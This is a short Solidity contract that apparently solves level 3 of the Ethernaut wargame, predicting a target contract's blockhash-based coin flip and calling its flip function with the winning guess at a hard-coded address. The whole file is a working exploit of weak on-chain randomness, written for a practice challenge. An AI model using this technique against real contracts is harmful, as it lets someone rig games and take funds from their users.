pragma solidity ^0.8.0;

interface ICoinFlipContract {
    function flip(bool _guess) external returns (bool);
}

contract EthernautLevel3 {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipContractAddress =
        0x6209728087035eAAFd5fccB3F3E9071fD6FC19c1;

    function attackCoinFlipContract() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / (FACTOR);
        bool side = coinFlip == 1 ? true : false;
        ICoinFlipContract(coinFlipContractAddress).flip(side);
    }
}
